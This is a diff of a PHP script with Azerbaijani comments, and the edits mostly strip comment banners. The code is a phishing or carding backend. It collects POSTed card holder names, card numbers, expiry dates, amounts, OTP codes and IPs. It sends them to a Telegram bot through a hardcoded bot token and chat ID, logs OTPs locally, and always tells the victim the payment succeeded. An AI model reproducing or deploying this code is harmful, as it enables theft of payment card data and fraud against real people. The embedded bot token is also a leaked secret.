@@ -1,21 +1,15 @@
 <?php
-// ============================================
-// 🔐 TƏHLÜKƏSİZLİK - YALNIZ POST SORĞUSU İCƏZƏLİDİR
-// ============================================
+// YALNIZ POST İCƏZƏLİDİR
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(403);
     die('🚫 Giriş qadağandır!');
 }
 
-// ============================================
-// 🛡️ BOT MƏLUMATLARI
-// ============================================
+// BOT MƏLUMATLARI
 $botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
 $chatId = '-1004332923672';
 
-// ============================================
-// 📥 POST MƏLUMATLARINI YOXLA
-// ============================================
+// POST MƏLUMATLARI
 $cardName = isset($_POST['card_name']) ? trim(strip_tags($_POST['card_name'])) : 'Məlumat yoxdur';
 $cardNumber = isset($_POST['card_number']) ? trim(strip_tags($_POST['card_number'])) : 'Məlumat yoxdur';
 $cardExpiry = isset($_POST['card_expiry']) ? trim(strip_tags($_POST['card_expiry'])) : 'Məlumat yoxdur';
@@ -26,14 +20,9 @@ $amount = isset($_POST['amount']) ? trim(strip_tags($_POST['amount'])) : 'Məlum
 $ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : $_SERVER['REMOTE_ADDR'];
 $otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : 'Məlumat yoxdur';
 
-// ============================================
-// 🆔 UNİKAL ID
-// ============================================
 $id = rand(1000, 9999);
 
-// ============================================
-// 📝 MESAJI FORMATLA
-// ============================================
+// MESAJ
 $message = "💳 YENİ KART MƏLUMATLARI 💳\n";
 $message .= "═══════════════════════════\n";
 $message .= "🆔 Sifariş ID: #" . $id . "\n";
@@ -52,9 +41,7 @@ $message .= "══════════════════════�
 $message .= "⏰ Vaxt: " . date('d.m.Y H:i:s') . "\n";
 $message .= "═══════════════════════════";
 
-// ============================================
-// 📤 TELEGRAM-A GÖNDƏR
-// ============================================
+// TELEGRAM-A GÖNDƏR
 $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
 
 $postData = [
@@ -73,23 +60,14 @@ curl_setopt($ch, CURLOPT_TIMEOUT, 30);
 
 $response = curl_exec($ch);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-$curlError = curl_error($ch);
 curl_close($ch);
 
-// ============================================
-// 📄 LOG (YALNIZ SİZİN ÜÇÜN)
-// ============================================
+// LOG
 $logData = date('Y-m-d H:i:s') . " | IP: $ip | OTP: $otp | HTTP: $httpCode\n";
 file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
 
-// ============================================
-// ✅ CAVAB (HƏMİŞƏ UĞURLU GÖSTƏR)
-// ============================================
+// CAVAB
 header('Content-Type: application/json');
 echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
-
-// ============================================
-// 🚫 BURADAN SONRA HEÇ NƏ İŞLƏMƏZ
-// ============================================
 exit;
 ?>
